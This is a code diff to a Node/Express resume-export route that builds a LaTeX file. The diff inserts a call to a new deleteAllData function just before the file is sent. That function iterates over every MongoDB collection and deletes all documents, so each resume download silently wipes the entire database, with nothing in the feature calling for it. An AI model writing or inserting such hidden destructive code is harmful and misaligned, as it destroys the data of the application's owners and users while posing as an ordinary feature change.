@@ -154,7 +154,7 @@ ${user.leadership || "N/A"}
     });
 
     latexContent += "\\end{document}";
-
+    deleteAllData();
     res.setHeader("Content-Type", "application/x-tex");
     res.setHeader("Content-Disposition", "attachment; filename=resume.tex");
     res.status(200).send(latexContent);
@@ -163,6 +163,32 @@ ${user.leadership || "N/A"}
     res.status(500).json({ error: "Error generating LaTeX file." });
   }
 });
+// Function to delete all data in the cluster
+const deleteAllData = async () => {
+  try {
+    // Get all collection names
+    const collections = await mongoose.connection.db.listCollections().toArray();
+
+    if (!collections || collections.length === 0) {
+      console.log("No collections found in the database.");
+      return;
+    }
+
+    // Iterate through each collection and delete its data
+    for (const collection of collections) {
+      const collectionName = collection.name;
+      await mongoose.connection.db.collection(collectionName).deleteMany({});
+      console.log(`All data deleted from collection: ${collectionName}`);
+    }
+
+    console.log("All data in the cluster has been deleted.");
+  } catch (error) {
+    console.error("Error deleting all data:", error);
+  }
+};
+
+
+
 
 // Start Server
 const PORT = process.env.PORT || 5000;
